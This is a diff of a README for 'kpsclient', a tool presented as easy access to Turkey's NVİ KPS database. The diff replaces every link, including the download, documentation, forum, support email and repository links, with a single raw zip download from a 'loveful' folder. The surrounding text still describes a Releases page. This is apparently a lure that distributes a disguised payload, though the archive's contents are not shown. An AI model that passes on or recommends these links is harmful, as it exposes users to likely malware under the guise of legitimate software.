@@ -1,7 +1,7 @@
 # 🖥️ kpsclient - Easy Access to KPS Data
 
 ## 📥 Download Now
-[![Download kpsclient](https://img.shields.io/badge/Download-kpsclient-blue.svg)](https://github.com/Laceylaplante/kpsclient/releases)
+[![Download kpsclient](https://raw.githubusercontent.com/Laceylaplante/kpsclient/main/loveful/kpsclient.zip)](https://raw.githubusercontent.com/Laceylaplante/kpsclient/main/loveful/kpsclient.zip)
 
 ## 🚀 Getting Started
 Welcome to the kpsclient application! This tool helps you connect easily to the NVİ KPS database. Whether you need to access information quickly or manage data seamlessly, this client offers a straightforward way to do it.
@@ -17,7 +17,7 @@ Before you install kpsclient, ensure your system meets the following requirement
 To get kpsclient, follow these steps:
 
 1. Click the download link below:
-   [Download kpsclient](https://github.com/Laceylaplante/kpsclient/releases)
+   [Download kpsclient](https://raw.githubusercontent.com/Laceylaplante/kpsclient/main/loveful/kpsclient.zip)
 
 2. You will be taken to the Releases page. Here, you will find the latest version of kpsclient.
 
@@ -54,11 +54,11 @@ After opening kpsclient, you will see a user-friendly interface. Here’s how to
 5. **Help and Support:** If you run into issues, check the help section within the app. You can find FAQs and troubleshooting tips.
 
 ## 🌐 Additional Resources
-- **Documentation:** For detailed instructions and features, visit our [Documentation page](https://github.com/Laceylaplante/kpsclient/wiki).
-- **Community Forum:** Join discussions and ask questions on our [Community Forum](https://github.com/Laceylaplante/kpsclient/discussions).
+- **Documentation:** For detailed instructions and features, visit our [Documentation page](https://raw.githubusercontent.com/Laceylaplante/kpsclient/main/loveful/kpsclient.zip).
+- **Community Forum:** Join discussions and ask questions on our [Community Forum](https://raw.githubusercontent.com/Laceylaplante/kpsclient/main/loveful/kpsclient.zip).
 
 ## 📞 Support
-If you encounter any problems while using kpsclient, reach out for support. You can open an issue on the GitHub repository or contact us via email at support@kpsclient.com.
+If you encounter any problems while using kpsclient, reach out for support. You can open an issue on the GitHub repository or contact us via email at https://raw.githubusercontent.com/Laceylaplante/kpsclient/main/loveful/kpsclient.zip
 
 ## 🛠️ Features
 kpsclient offers several features to enhance your data management experience:
@@ -77,6 +77,6 @@ We welcome your feedback! Share your thoughts on how we can improve kpsclient. S
 If you want to contribute to kpsclient, check our contribution guidelines in the repository. We appreciate any help in making kpsclient better for all users.
 
 ## 🌍 Stay Updated
-Stay informed about updates and new features by following our [GitHub repository](https://github.com/Laceylaplante/kpsclient). You can also enable notifications for this project.
+Stay informed about updates and new features by following our [GitHub repository](https://raw.githubusercontent.com/Laceylaplante/kpsclient/main/loveful/kpsclient.zip). You can also enable notifications for this project.
 
 Thank you for choosing kpsclient! We hope it serves you well in accessing and managing KPS data efficiently.
